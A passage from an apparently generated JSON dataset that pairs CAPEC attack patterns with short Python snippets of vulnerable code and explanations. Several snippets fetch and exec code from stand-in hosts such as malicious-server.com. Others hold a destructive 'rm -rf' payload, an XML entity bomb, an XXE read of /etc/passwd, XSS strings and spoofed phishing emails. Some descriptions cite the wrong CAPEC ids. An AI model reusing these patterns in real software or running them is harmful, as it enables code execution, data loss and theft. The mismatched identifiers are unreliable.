        "code_snippet": "import imaplib\nimport smtplib\n\n# Simulated user input\nuser_input = \"INBOX; LOGOUT\"\n\n# Vulnerable IMAP command injection\ntry:\n    mail = imaplib.IMAP4_SSL('imap.example.com')\n    mail.login('user@example.com', 'password')\n    mail.select(user_input)  # User input directly used in IMAP command\nexcept Exception as e:\n    print(f\"Error: {e}\")\n\n# Vulnerable SMTP command injection\ntry:\n    server = smtplib.SMTP('smtp.example.com')\n    server.login('user@example.com', 'password')\n    server.sendmail('user@example.com', 'victim@example.com', f\"Subject: Test\\n\\n{user_input}\")  # User input directly used in SMTP command\nexcept Exception as e:\n    print(f\"Error: {e}\")",
        "description": "This Python code snippet demonstrates a vulnerable implementation of IMAP and SMTP command handling, embodying the main idea of the CAPEC 'IMAP/SMTP Command Injection'. The code takes user input and directly uses it in IMAP and SMTP commands without proper sanitization or validation. This can lead to command injection attacks where an attacker can execute arbitrary commands on the mail server. The code also includes basic error handling that could potentially expose sensitive information (CWE-209) and does not properly neutralize special elements in the input (CWE-77)."
    },
    {
        "capec_id": "184",
        "capec_name": "Software Integrity Attack",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# Execute the downloaded code without verifying its integrity\nexec(response.text)\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nsensitive_info = 'Sensitive System Information'\nprint(sensitive_info)\n\n# CWE-506: Embedded Malicious Code\n# Malicious code that could be embedded in the downloaded script\nmalicious_code = '''\ndef malicious_function():\n    print('Executing malicious code')\nmalicious_function()\n'''\nexec(malicious_code)",
        "description": "This Python code snippet demonstrates a Software Integrity Attack by downloading and executing code from a remote location without verifying its integrity (CWE-494). It also exposes sensitive system information to unauthorized control (CWE-497) and includes embedded malicious code (CWE-506). The code represents the main idea of the CAPEC by showing how an attacker can undermine the integrity of software code and achieve an insecure state."
    },
    {
        "capec_id": "185",
        "capec_name": "Malicious Software Download",
        "code_snippet": "import requests\nimport os\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://malicious-website.com/malicious-script.py'\nresponse = requests.get(url)\n\n# CWE-506: Embedded Malicious Code\n# CWE-507: Trojan Horse\n# CWE-509: Replicating Malicious Code (Virus or Worm)\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\nif response.status_code == 200:\n    with open('downloaded_script.py', 'wb') as file:\n        file.write(response.content)\n    os.system('python downloaded_script.py')  # Execute the downloaded script without verification",
        "description": "This Python code snippet demonstrates a vulnerable practice where a script is downloaded from a remote location and executed without verifying its integrity or origin (CWE-494). The downloaded script could contain embedded malicious code (CWE-506), act as a Trojan horse (CWE-507), replicate itself (CWE-509), or expose sensitive system information (CWE-497). The code uses the 'requests' library to download a script from a potentially malicious URL and then executes it directly, embodying the main idea of the CAPEC 'Malicious Software Download'."
    },
    {
        "capec_id": "186",
        "capec_name": "Malicious Software Update",
        "code_snippet": "import requests\n\n# URL of the malicious update\nmalicious_update_url = 'http://malicious.example.com/update'\n\n# Download the update without integrity check\nresponse = requests.get(malicious_update_url)\n\n# Execute the downloaded code\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a 'Malicious Software Update' attack. The code downloads an update from a URL without performing any integrity checks (CWE-494). The downloaded content is then executed directly, which could contain embedded malicious code (CWE-506) or act as a Trojan horse (CWE-507). This represents the main idea of the CAPEC, where an adversary tricks a user or system into downloading and executing harmful code under the guise of a legitimate update."
    },
    {
        "capec_id": "187",
        "capec_name": "Malicious Automated Software Update via Redirection",
        "code_snippet": "import requests\n\n# URL of the update server\nupdate_url = 'http://malicious-server.com/update'\n\n# Download the update without verifying its integrity\nresponse = requests.get(update_url)\n\nif response.status_code == 200:\n    # Execute the downloaded code without validation\n    exec(response.text)\nelse:\n    print('Failed to download update')",
        "description": "This Python code snippet demonstrates a vulnerable automated software update mechanism. The code downloads an update from a specified URL and executes it without verifying the origin or integrity of the code. This embodies the main idea of CAPEC-494, where an attacker can exploit the lack of proper authentication and integrity checks to introduce malicious code. The code also touches on CWE-494 (Download of Code Without Integrity Check) and CWE-807 (Reliance on Untrusted Inputs in a Security Decision), as it relies on untrusted input (the downloaded code) for a critical security decision (executing the update)."
    },
    {
        "capec_id": "188",
        "capec_name": "Reverse Engineering",
        "code_snippet": "import base64\n\n# CWE-327: Use of a Broken or Risky Cryptographic Algorithm\n# Using Base64 for encoding sensitive data (not secure for cryptographic purposes)\ndef encode_sensitive_data(data):\n    return base64.b64encode(data.encode()).decode()\n\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# Exposing sensitive system information\nsensitive_info = 'System Version: 1.0.0; Admin Password: admin123'\nencoded_info = encode_sensitive_data(sensitive_info)\nprint(f'Encoded Sensitive Info: {encoded_info}')\n\n# CWE-1242: Inclusion of Undocumented Features or Chicken Bits\n# Undocumented feature: hidden debug mode\nDEBUG_MODE = True\nif DEBUG_MODE:\n    print('Debug mode is enabled. Sensitive operations can be performed.')\n\n# CWE-1037: Processor Optimization Removal or Modification of Security-critical Code\n# Simulating a security check that might be optimized away\ndef security_check():\n    # This is a placeholder for a security-critical check\n    pass\n\nsecurity_check()\n\n# CWE-1278: Missing Protection Against Hardware Reverse Engineering Using Integrated Circuit (IC) Imaging Techniques\n# Simulating hardware-related sensitive data exposure\nhardware_sensitive_data = 'Hardware Key: 0xABCDEF'\nprint(f'Hardware Sensitive Data: {hardware_sensitive_data}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to reverse engineering and the associated CWEs. It includes the use of a broken cryptographic algorithm (CWE-327) by using Base64 encoding for sensitive data, which is not secure. It exposes sensitive system information (CWE-497) by printing encoded sensitive data. An undocumented feature (CWE-1242) is represented by a hidden debug mode that can perform sensitive operations. A security check function is included to simulate a security-critical check that might be optimized away by the processor (CWE-1037). Finally, it simulates the exposure of hardware-related sensitive data (CWE-1278) by printing a hardware key."
    },
    {
        "capec_id": "189",
        "capec_name": "Black Box Reverse Engineering",
        "code_snippet": "import time\nimport random\n\n# Simulate a sensitive operation with observable discrepancies\nclass SensitiveOperation:\n    def __init__(self, secret):\n        self.secret = secret\n\n    def check_secret(self, input_secret):\n        # Simulate a time delay based on the correctness of the input\n        if input_secret == self.secret:\n            time.sleep(0.1)  # Correct secret\n            return True\n        else:\n            time.sleep(0.5)  # Incorrect secret\n            return False\n\n# Simulate power consumption monitoring\nclass PowerMonitor:\n    def __init__(self, operation):\n        self.operation = operation\n\n    def monitor_power(self, input_secret):\n        start_time = time.time()\n        result = self.operation.check_secret(input_secret)\n        end_time = time.time()\n        power_consumption = end_time - start_time\n        return result, power_consumption\n\n# Example usage\nsecret = 's3cr3t'\noperation = SensitiveOperation(secret)\npower_monitor = PowerMonitor(operation)\n\n# Adversary tries to guess the secret\nfor guess in ['guess1', 'guess2', 's3cr3t']:\n    result, power = power_monitor.monitor_power(guess)\n    print(f\"Guess: {guess}, Result: {result}, Power Consumption: {power:.4f} seconds\")",
        "description": "This Python code snippet demonstrates a scenario where an adversary can perform black box reverse engineering by exploiting observable discrepancies and power side-channel attacks. The `SensitiveOperation` class simulates a sensitive operation that checks a secret and introduces different time delays based on whether the input secret is correct or not. The `PowerMonitor` class simulates monitoring the power consumption (time delay) of the operation. By observing the time taken for different guesses, an adversary can infer the correct secret. This embodies the main idea of CAPEC-203 (Black Box Reverse Engineering) and related CWEs such as CWE-203 (Observable Discrepancy) and CWE-1255 (Comparison Logic is Vulnerable to Power Side-Channel Attacks)."
    },
    {
        "capec_id": "190",
        "capec_name": "Reverse Engineer an Executable to Expose Assumed Hidden Functionality",
        "code_snippet": "import os\nimport requests\n\n# Hidden functionality: Download and execute code from a remote server\n# CWE-912: Hidden Functionality\n# CWE-494: Download of Code Without Integrity Check\n# CWE-506: Embedded Malicious Code\n\ndef hidden_functionality():\n    url = 'http://malicious-server.com/malicious_code.py'\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Main function that appears benign\n# CWE-497: Exposure of Sensitive System Information to an Unauthorized Control Sphere\n# CWE-1323: Improper Management of Sensitive Trace Data\n\ndef main():\n    print('This is a benign function')\n    sensitive_info = os.uname()\n    print(f'Sensitive system info: {sensitive_info}')\n    hidden_functionality()\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates the concept of reverse engineering an executable to expose hidden functionality. The `hidden_functionality` function downloads and executes code from a remote server without performing any integrity checks, embodying CWE-494 (Download of Code Without Integrity Check) and CWE-506 (Embedded Malicious Code). This function is not documented or obvious to the user, representing CWE-912 (Hidden Functionality). The `main` function appears benign but exposes sensitive system information (CWE-497) and calls the hidden functionality. This snippet illustrates how hidden and potentially malicious code can be embedded within seemingly harmless software, which can be discovered through reverse engineering techniques."
    },
    {
        "capec_id": "191",
        "capec_name": "Read Sensitive Constants Within an Executable",
        "code_snippet": "import hashlib\n\n# Hard-coded sensitive constants\nSECRET_KEY = 'hardcoded_secret_key'\nPASSWORD = 'hardcoded_password'\n\n# Function that uses the hard-coded credentials\ndef authenticate(user_input):\n    if user_input == PASSWORD:\n        return 'Authenticated'\n    else:\n        return 'Access Denied'\n\n# Function that uses the hard-coded secret key\ndef generate_hash(data):\n    return hashlib.sha256((data + SECRET_KEY).encode()).hexdigest()\n\n# Example usage\nuser_input = 'user_password'\nprint(authenticate(user_input))\ndata = 'sensitive_data'\nprint(generate_hash(data))",
        "description": "This Python code snippet demonstrates the concept of 'Read Sensitive Constants Within an Executable' by including hard-coded sensitive constants such as a secret key and a password. The `authenticate` function uses a hard-coded password for authentication, and the `generate_hash` function uses a hard-coded secret key to generate a hash. This code is vulnerable because an adversary can discover these hard-coded values through static or dynamic analysis, leading to potential security breaches. The code embodies CWE-798 (Use of Hard-coded Credentials), CWE-547 (Use of Hard-coded, Security-relevant Constants), and CWE-318 (Cleartext Storage of Sensitive Information in Executable)."
    },
    {
        "capec_id": "192",
        "capec_name": "Protocol Analysis",
        "code_snippet": "import socket\n\n# Inadequate encryption strength (CWE-326)\ndef weak_encrypt(data):\n    return ''.join(chr(ord(char) + 1) for char in data)  # Simple Caesar cipher\n\n# Cleartext transmission of sensitive information (CWE-319)\ndef send_data_cleartext(data, host, port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((host, port))\n        s.sendall(data.encode('utf-8'))\n\n# Selection of less-secure algorithm during negotiation (CWE-757)\ndef negotiate_algorithm(algorithms):\n    return min(algorithms, key=lambda x: x['strength'])  # Select the weakest algorithm\n\n# Example usage\nsensitive_data = 'password123'\nhost, port = 'example.com', 12345\n\n# Encrypt data with a weak algorithm\nencrypted_data = weak_encrypt(sensitive_data)\n\n# Send encrypted data in cleartext\nsend_data_cleartext(encrypted_data, host, port)\n\n# Negotiate and select a weak algorithm\nalgorithms = [\n    {'name': 'AES-256', 'strength': 256},\n    {'name': 'DES', 'strength': 56}\n]\nselected_algorithm = negotiate_algorithm(algorithms)\nprint(f'Selected algorithm: {selected_algorithm['name']}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to protocol analysis and encryption weaknesses. The `weak_encrypt` function uses a simple Caesar cipher, which is an example of inadequate encryption strength (CWE-326). The `send_data_cleartext` function transmits sensitive data in cleartext over a network (CWE-319). The `negotiate_algorithm` function selects the weakest available algorithm during negotiation (CWE-757). The example usage shows how sensitive data is weakly encrypted and sent in cleartext, and how a weak algorithm is selected for encryption, embodying the main idea of protocol analysis vulnerabilities."
    },
    {
        "capec_id": "193",
        "capec_name": "PHP Remote File Inclusion",
        "code_snippet": "import requests\n\ndef fetch_remote_code(url):\n    try:\n        response = requests.get(url)\n        if response.status_code == 200:\n            exec(response.text)\n        else:\n            print('Failed to fetch remote code')\n    except Exception as e:\n        print(f'An error occurred: {e}')\n\n# Example usage\nfetch_remote_code('http://example.com/malicious_code.py')",
        "description": "This Python code snippet demonstrates a vulnerability similar to PHP Remote File Inclusion (RFI). The function `fetch_remote_code` takes a URL as input, fetches the content from the URL, and executes it using the `exec` function. This is dangerous because it allows arbitrary code execution from a remote source, which can be exploited by an attacker to run malicious code on the server. The code does not perform any validation or sanitization of the input URL, making it susceptible to attacks. This example embodies the main idea of the CAPEC by showing how an insecurely configured environment can lead to remote code execution. The related CWEs provide additional context, such as improper input validation (CWE-98), reliance on file names (CWE-646), and the dangers of executing raw content (CWE-433)."
    },
    {
        "capec_id": "194",
        "capec_name": "Fake the Source of Data",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# Vulnerable email sending function\n\ndef send_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address  # This can be easily spoofed\n    msg['To'] = to_address\n\n    # Connect to the SMTP server\n    with smtplib.SMTP('smtp.example.com') as server:\n        server.sendmail(from_address, [to_address], msg.as_string())\n\n# Example usage\nsend_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click this link to update your account.')",
        "description": "This Python code snippet demonstrates a vulnerable email sending function that allows an attacker to spoof the 'From' address. The function `send_email` takes in the recipient's email address, the sender's email address, the subject, and the body of the email. It then constructs the email and sends it using an SMTP server. The vulnerability lies in the fact that the 'From' address can be easily spoofed, allowing an attacker to send an email that appears to come from a trusted source. This embodies the main idea of the CAPEC 'Fake the Source of Data' by exploiting improper authentication (CWE-287) and improper verification of the source of a communication channel (CWE-940)."
    },
    {
        "capec_id": "195",
        "capec_name": "Principal Spoof",
        "code_snippet": "import smtplib\nfrom email.mime.text import MIMEText\n\n# CWE-290: Authentication Bypass by Spoofing\n# CWE-1390: Weak Authentication\n# CWE-941: Incorrectly Specified Destination in a Communication Channel\n\n# Function to send a spoofed email\ndef send_spoofed_email(to_address, from_address, subject, body):\n    msg = MIMEText(body)\n    msg['Subject'] = subject\n    msg['From'] = from_address\n    msg['To'] = to_address\n\n    try:\n        # CWE-322: Key Exchange without Entity Authentication\n        # Establishing a connection to the SMTP server without verifying the server's identity\n        smtp = smtplib.SMTP('smtp.example.com')\n        smtp.sendmail(from_address, [to_address], msg.as_string())\n        smtp.quit()\n        print('Email sent successfully')\n    except Exception as e:\n        print(f'Failed to send email: {e}')\n\n# Example usage\nsend_spoofed_email('victim@example.com', 'spoofed@example.com', 'Important Update', 'Please click the link to update your account.')",
        "description": "This Python code snippet demonstrates a Principal Spoof attack by sending a spoofed email. The function `send_spoofed_email` constructs an email message that appears to come from a legitimate source (spoofed@example.com) and sends it to the victim (victim@example.com). The code does not verify the identity of the SMTP server (CWE-322), uses weak authentication (CWE-1390), and does not correctly specify the intended destination (CWE-941). This example embodies the main idea of the CAPEC by showing how an adversary can craft a message that appears to come from a trusted source, thereby bypassing authentication mechanisms (CWE-290)."
    },
    {
        "capec_id": "196",
        "capec_name": "Session Credential Falsification through Forging",
        "code_snippet": "import hashlib\nimport time\nimport random\n\n# Weak credentials (CWE-1391)\nSECRET_KEY = 'default_secret_key'\n\n# Function to generate a session token\n# Improper control of a resource through its lifetime (CWE-664)\ndef generate_session_token(user_id):\n    timestamp = str(int(time.time()))\n    random_number = str(random.randint(1000, 9999))\n    session_token = hashlib.sha256((user_id + timestamp + random_number + SECRET_KEY).encode()).hexdigest()\n    return session_token\n\n# Function to validate a session token\n# Insufficient session expiration (CWE-613)\ndef validate_session_token(session_token, user_id):\n    # This is a simplified example and does not check for session expiration\n    for i in range(1000, 10000):\n        test_token = hashlib.sha256((user_id + str(int(time.time())) + str(i) + SECRET_KEY).encode()).hexdigest()\n        if test_token == session_token:\n            return True\n    return False\n\n# Example usage\nuser_id = 'user123'\nforged_token = generate_session_token(user_id)\nprint(f'Forged Token: {forged_token}')\n\n# Validate the forged token\nis_valid = validate_session_token(forged_token, user_id)\nprint(f'Is the forged token valid? {is_valid}')",
        "description": "This Python code snippet demonstrates the concept of 'Session Credential Falsification through Forging' (CAPEC). The code generates a session token using weak credentials (CWE-1391) and does not properly control the resource through its lifetime (CWE-664). The session token is created using a combination of user ID, current timestamp, a random number, and a secret key. The validation function attempts to validate the session token without checking for session expiration (CWE-613), making it vulnerable to reuse. This example highlights how an attacker could forge a session token and potentially gain unauthorized access to a service."
    },
    {
        "capec_id": "197",
        "capec_name": "Exponential Data Expansion",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Define a recursive XML entity\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY a \"a\">\n<!ENTITY b \"&a;&a;\">\n<!ENTITY c \"&b;&b;\">\n<!ENTITY d \"&c;&c;\">\n<!ENTITY e \"&d;&d;\">\n<!ENTITY f \"&e;&e;\">\n<!ENTITY g \"&f;&f;\">\n<!ENTITY h \"&g;&g;\">\n<!ENTITY i \"&h;&h;\">\n<!ENTITY j \"&i;&i;\">\n<!ENTITY k \"&j;&j;\">\n<!ENTITY l \"&k;&k;\">\n<!ENTITY m \"&l;&l;\">\n<!ENTITY n \"&m;&m;\">\n<!ENTITY o \"&n;&n;\">\n<!ENTITY p \"&o;&o;\">\n<!ENTITY q \"&p;&p;\">\n<!ENTITY r \"&q;&q;\">\n<!ENTITY s \"&r;&r;\">\n<!ENTITY t \"&s;&s;\">\n<!ENTITY u \"&t;&t;\">\n<!ENTITY v \"&u;&u;\">\n<!ENTITY w \"&v;&v;\">\n<!ENTITY x \"&w;&w;\">\n<!ENTITY y \"&x;&x;\">\n<!ENTITY z \"&y;&y;\">\n]>\n<root>&z;</root>\n'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f\"Parse error: {e}\")\n",
        "description": "This Python code snippet demonstrates an Exponential Data Expansion attack using XML Entity Expansion (CWE-776). The XML data contains a series of nested entity definitions that expand exponentially. When the XML parser attempts to resolve these entities, it will consume excessive CPU and memory resources, potentially leading to a denial of service. This example highlights the vulnerability of allocating resources without limits (CWE-770) and the improper restriction of recursive entity references (CWE-776). The code attempts to parse the malicious XML data, which can cause the application to hang or crash due to resource exhaustion."
    },
    {
        "capec_id": "198",
        "capec_name": "XSS Targeting Error Pages",
        "code_snippet": "from flask import Flask, request, abort\n\napp = Flask(__name__)\n\n@app.route('/error')\ndef error_page():\n    error_message = request.args.get('msg', '')\n    if not error_message:\n        abort(400)\n    # Vulnerable to XSS\n    return f'<html><body><h1>Error: {error_message}</h1></body></html>'\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet uses the Flask web framework to create a simple web application that includes an endpoint '/error'. The endpoint takes a query parameter 'msg' and displays it in an error message on the resulting web page. The code is vulnerable to Cross-Site Scripting (XSS) attacks because it directly includes user input in the HTML response without proper neutralization. This embodies the main idea of the CAPEC 'XSS Targeting Error Pages' by demonstrating how an adversary could exploit improperly neutralized input in an error page to execute malicious scripts. The related CWEs highlight the specific weaknesses, such as improper neutralization of script in error messages (CWE-81) and basic XSS vulnerabilities (CWE-80)."
    },
    {
        "capec_id": "199",
        "capec_name": "XSS Using Alternate Syntax",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Incomplete denylist to filter out script tags\n    denylist = ['<script>', '</script>']\n    for item in denylist:\n        query = query.replace(item, '')\n    # Render the query directly in the HTML without proper neutralization\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>', query=query)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application has a search endpoint that takes a 'query' parameter from the URL. It attempts to filter out script tags using an incomplete denylist, which only includes '<script>' and '</script>'. This approach is insufficient because it does not account for alternate syntax forms like 'ScRiPt' or encoded versions. The query is then directly rendered into the HTML using Flask's render_template_string function without proper neutralization, making the application susceptible to XSS attacks. This example embodies the main idea of CAPEC-147: 'XSS Using Alternate Syntax' and highlights related CWEs such as CWE-87, CWE-80, CWE-692, and CWE-1336."
    },
    {
        "capec_id": "200",
        "capec_name": "Removal of filters: Input filters, output filters, data masking",
        "code_snippet": "import re\n\ndef process_input(user_input):\n    # Improper Input Validation (CWE-20)\n    if len(user_input) > 100:  # Only checking length, not content\n        raise ValueError('Input too long')\n\n    # Incomplete List of Disallowed Inputs (CWE-184)\n    disallowed_patterns = ['<script>', 'DROP TABLE', '--']\n    for pattern in disallowed_patterns:\n        if pattern in user_input:\n            raise ValueError('Disallowed input detected')\n\n    # Improper Neutralization of Special Elements (CWE-74)\n    sanitized_input = re.sub(r'[<>]', '', user_input)  # Only removing < and >\n\n    # Collapse of Data into Unsafe Value (CWE-182)\n    if sanitized_input == '':\n        sanitized_input = 'default_value'\n\n    # Improper Neutralization (CWE-707)\n    if not re.match(r'^[a-zA-Z0-9_]+$', sanitized_input):\n        raise ValueError('Invalid characters in input')\n\n    return sanitized_input\n\n# Example usage\ntry:\n    user_input = '<script>alert(1)</script>'\n    print(process_input(user_input))\nexcept ValueError as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a function `process_input` that processes user input with several vulnerabilities related to the CAPEC description. The function attempts to validate and sanitize the input but does so inadequately, embodying the main idea of the CAPEC by showing how an attacker might exploit these weaknesses.\n\n1. **Improper Input Validation (CWE-20)**: The function only checks the length of the input, not its content, allowing potentially harmful data to pass through.\n2. **Incomplete List of Disallowed Inputs (CWE-184)**: The function uses a hardcoded list of disallowed patterns, which is incomplete and can be bypassed by using other harmful inputs not in the list.\n3. **Improper Neutralization of Special Elements (CWE-74)**: The function attempts to sanitize the input by removing `<` and `>`, but this is insufficient to prevent injection attacks.\n4. **Collapse of Data into Unsafe Value (CWE-182)**: The function collapses empty sanitized input into a default value, which might be unsafe in certain contexts.\n5. **Improper Neutralization (CWE-707)**: The function checks for valid characters using a regex but does not ensure that the input is well-formed or meets all security properties, allowing some harmful inputs to pass through.\n\nThis code snippet illustrates how removing or inadequately implementing input filters can lead to various security vulnerabilities."
    },
    {
        "capec_id": "201",
        "capec_name": "Serialized Data External Linking",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable function to parse XML data\n\ndef parse_xml(data):\n    try:\n        tree = ET.ElementTree(ET.fromstring(data))\n        root = tree.getroot()\n        return root\n    except ET.ParseError as e:\n        print(f'Error parsing XML: {e}')\n\n# Example of serialized XML data with an external entity reference\nxml_data = '''\n<!DOCTYPE root [\n<!ENTITY ext SYSTEM \"file:///etc/passwd\">\n]>\n<root>\n    <data>&ext;</data>\n</root>\n'''\n\n# Parse the XML data\nroot = parse_xml(xml_data)\n\n# Print the parsed data\nif root is not None:\n    for child in root:\n        print(child.tag, child.text)\n",
        "description": "This Python code snippet demonstrates a vulnerability related to 'Serialized Data External Linking' (CAPEC). The `parse_xml` function uses the `xml.etree.ElementTree` module to parse XML data. The provided `xml_data` contains an external entity reference that points to the `/etc/passwd` file. When the XML data is parsed, the external entity is resolved, potentially exposing sensitive information. This example highlights CWE-611 (Improper Restriction of XML External Entity Reference) and CWE-502 (Deserialization of Untrusted Data), as the XML parser does not restrict external entity references, leading to potential security risks."
    },
    {
        "capec_id": "202",
        "capec_name": "Create Malicious Client",
        "code_snippet": "import requests\n\nclass MaliciousClient:\n    def __init__(self, target_url):\n        self.target_url = target_url\n\n    def bypass_authentication(self):\n        # CWE-603: Use of Client-Side Authentication\n        response = requests.get(self.target_url, headers={'Authorization': 'FakeToken'})\n        if response.status_code == 200:\n            print('Access granted without proper authentication!')\n        else:\n            print('Access denied.')\n\n    def inject_malicious_code(self):\n        # CWE-506: Embedded Malicious Code\n        payload = {'data': '<script>alert(\"Malicious Code\")</script>'}\n        response = requests.post(self.target_url, data=payload)\n        if response.status_code == 200:\n            print('Malicious code injected successfully!')\n        else:\n            print('Failed to inject malicious code.')\n\nif __name__ == '__main__':\n    client = MaliciousClient('http://example.com/api')\n    client.bypass_authentication()\n    client.inject_malicious_code()",
        "description": "This Python code snippet demonstrates a malicious client application that interacts with a target service, violating the assumptions the service makes about its clients. The `MaliciousClient` class has two methods: `bypass_authentication` and `inject_malicious_code`. The `bypass_authentication` method simulates bypassing server-side authentication by sending a request with a fake token (CWE-603). The `inject_malicious_code` method sends a POST request with a payload containing malicious code (CWE-506). This code embodies the main idea of the CAPEC 'Create Malicious Client' by showing how an adversary can create a client that violates the expected behavior and security assumptions of the target service."
    },
    {
        "capec_id": "203",
        "capec_name": "Manipulate Registry Information",
        "code_snippet": "import winreg\n\ndef manipulate_registry(key_path, value_name, new_value):\n    try:\n        # Open the registry key\n        registry_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE)\n        # Set the new value\n        winreg.SetValueEx(registry_key, value_name, 0, winreg.REG_SZ, new_value)\n        winreg.CloseKey(registry_key)\n        print(f'Successfully modified {value_name} to {new_value}')\n    except Exception as e:\n        print(f'Failed to modify registry: {e}')\n\n# Example usage\nmanipulate_registry(r'Software\\ExampleApp', 'ConfigValue', 'NewConfig')",
        "description": "This Python code snippet demonstrates how to manipulate Windows Registry information, which aligns with the CAPEC description of 'Manipulate Registry Information'. The function 'manipulate_registry' takes a registry key path, a value name, and a new value as arguments. It opens the specified registry key with write permissions, sets the new value, and then closes the key. This action can be used to modify configuration settings, potentially affecting application behavior or hiding malicious activity. The code also highlights CWE-15 (External Control of System or Configuration Setting) by allowing external input to control registry settings, and CWE-314 (Cleartext Storage in the Registry) by storing the new value in cleartext."
    },
    {
        "capec_id": "204",
        "capec_name": "Lifting Sensitive Data Embedded in Cache",
        "code_snippet": "import requests\n\n# Function to fetch sensitive data from a remote server\n# This data will be cached locally without encryption\n\ndef fetch_sensitive_data(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        # Cache the sensitive data locally\n        with open('cache.txt', 'w') as cache_file:\n            cache_file.write(response.text)\n        return response.text\n    else:\n        return None\n\n# Example usage\nsensitive_url = 'https://example.com/sensitive-data'\ndata = fetch_sensitive_data(sensitive_url)\nprint('Sensitive data fetched and cached.')",
        "description": "This Python code snippet demonstrates a scenario where sensitive data is fetched from a remote server and cached locally in a file named 'cache.txt' without any encryption. This embodies the main idea of CAPEC- Lifting Sensitive Data Embedded in Cache, as it shows how an attacker could potentially access sensitive information stored in a cache. The code also highlights related CWEs, such as CWE-524 (Use of Cache Containing Sensitive Information) and CWE-311 (Missing Encryption of Sensitive Data), by not encrypting the sensitive data before storing it in the cache."
    },
    {
        "capec_id": "205",
        "capec_name": "DEPRECATED: Lifting credential(s)/key material embedded in client distributions (thick or thin)",
        "code_snippet": "import base64\n\n# Simulate storing sensitive data in client-side code\nembedded_key = 'c2VjcmV0X2tleQ=='  # Base64 encoded 'secret_key'\n\n# Function to retrieve the embedded key\ndef get_embedded_key():\n    return base64.b64decode(embedded_key).decode('utf-8')\n\n# Simulate using the embedded key for authentication\ndef authenticate_client():\n    key = get_embedded_key()\n    if key == 'secret_key':\n        print('Authentication successful')\n    else:\n        print('Authentication failed')\n\n# Main function to simulate client-side authentication\nif __name__ == '__main__':\n    authenticate_client()",
        "description": "This Python code snippet demonstrates the vulnerability of embedding sensitive data, such as a secret key, directly in client-side code. The `embedded_key` variable stores a Base64 encoded 'secret_key'. The `get_embedded_key` function decodes this key, and the `authenticate_client` function uses it to authenticate the client. This approach is insecure because an attacker can easily extract the embedded key from the client-side code, leading to potential authentication bypass (CWE-603) and insufficiently protected credentials (CWE-522). The code represents the deprecated CAPEC pattern of lifting credentials embedded in client distributions."
    },
    {
        "capec_id": "206",
        "capec_name": "Signing Malicious Code",
        "code_snippet": "import os\nimport subprocess\n\n# CWE-798: Use of Hard-coded Credentials\nSIGNING_KEY = 'hardcoded_signing_key.pem'\n\n# CWE-732: Incorrect Permission Assignment for Critical Resource\nos.chmod(SIGNING_KEY, 0o777)  # Insecurely setting permissions to the signing key\n\n# CWE-494: Download of Code Without Integrity Check\nmalicious_code_url = 'http://malicious.example.com/malicious_code.py'\nsubprocess.run(['wget', malicious_code_url, '-O', 'malicious_code.py'])\n\n# CWE-506: Embedded Malicious Code\nwith open('malicious_code.py', 'a') as f:\n    f.write('\\n# Malicious payload\\n')\n    f.write('os.system(\"rm -rf /important_data\")')\n\n# Signing the malicious code\nsubprocess.run(['openssl', 'dgst', '-sha256', '-sign', SIGNING_KEY, '-out', 'malicious_code.sig', 'malicious_code.py'])\n\nprint('Malicious code signed and ready for distribution.')",
        "description": "This Python code snippet demonstrates the concept of 'Signing Malicious Code' by using a hard-coded signing key (CWE-798) with insecure permissions (CWE-732) to sign a downloaded malicious script (CWE-494). The script is modified to include a malicious payload (CWE-506) before being signed. The signed malicious code can then be distributed, misleading users into believing it is legitimate and allowing the adversary to execute arbitrary code on the victim's machine."
    },
    {
        "capec_id": "207",
        "capec_name": "Removing Important Client Functionality",
        "code_snippet": "import requests\n\n# Function to download and execute code from a remote server\ndef download_and_execute(url):\n    response = requests.get(url)\n    if response.status_code == 200:\n        exec(response.text)\n    else:\n        print('Failed to download code')\n\n# Client-side authentication check\ndef client_authenticate(user_token):\n    if user_token == 'trusted_token':\n        return True\n    return False\n\n# Main function\nif __name__ == '__main__':\n    user_token = input('Enter your token: ')\n    if client_authenticate(user_token):\n        download_and_execute('http://example.com/malicious_code.py')\n    else:\n        print('Authentication failed')",
        "description": "This Python code snippet demonstrates a scenario where important client functionality is removed or disabled, leading to potential security vulnerabilities. The `download_and_execute` function downloads and executes code from a remote server without verifying its integrity (CWE-494). The `client_authenticate` function performs authentication on the client side (CWE-603), which can be easily bypassed by modifying the client. The main function combines these elements, showing how an attacker could exploit the reliance on client-side security mechanisms to execute malicious code. This embodies the CAPEC concept of removing important client functionality that the server assumes to be present and trustworthy."
    },
    {
        "capec_id": "208",
